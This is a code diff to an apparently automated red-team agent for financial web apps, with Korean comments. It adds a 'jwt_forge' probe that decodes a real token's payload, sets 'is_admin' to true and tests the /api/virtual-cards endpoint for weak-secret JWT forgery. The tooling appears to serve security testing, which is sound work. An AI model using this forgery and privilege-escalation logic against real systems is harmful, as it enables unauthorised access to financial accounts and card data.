@@ -60,6 +60,7 @@ from finredteam.planning.actions import (
 from finredteam.planning.candidates import AttackTemplate, CandidateSkeleton
 from finredteam.probing import executor as executor_module
 from finredteam.probing.finance import auth_exposure, card_exposure, card_fund, privesc
+from finredteam.probing.generic import api as generic_api
 from finredteam.probing.generic import web as generic_web
 from finredteam.probing.session import Session, SessionError
 from finredteam.recon import auth_discovery
@@ -198,6 +199,7 @@ class AgentContext:
             "privilege_escalation": {"mass_assignment_privesc"},
             "card_fund": {"card_fund"},
             "sqli_scan": {"sqli_check_balance", "sqli_transactions"},
+            "jwt_forge": {"jwt_weak_secret"},
         }
         tried = self.episodic.tried_operations()
         return [name for name, ops in probe_ops.items() if not (ops & tried)]
@@ -778,6 +780,23 @@ def _handle_run_probe(input_: RunProbeInput, ctx: AgentContext) -> str:
             for op, template, record_path in targets
         ]
         return "\n".join(lines)
+
+    elif input_.probe == "jwt_forge":
+        # 위조 토큰의 payload 구조는 실제 발급 토큰에서 가져온다(부트스트랩된 주체).
+        tokened = next((p for p in ctx.principals if p.token), None)
+        if tokened is None:
+            return "jwt_forge: 참조할 정상 토큰을 가진 주체가 없음"
+        import base64 as _b64
+        import json as _json
+        try:
+            seg = tokened.token.split(".")[1]
+            seg += "=" * (-len(seg) % 4)
+            payload = _json.loads(_b64.urlsafe_b64decode(seg))
+        except Exception:
+            payload = {"user_id": 1, "is_admin": True}
+        payload = {**payload, "is_admin": True}  # 위조 시 권한 승격까지 시도
+        outcome = generic_api.probe_jwt_weak_secret(ctx.session, "/api/virtual-cards", "GET", payload)
+        return _record_generic_outcome(ctx, "jwt_weak_secret", "GET", "/api/virtual-cards", outcome)
 
     else:
         return f"알 수 없는 probe: {input_.probe!r}"
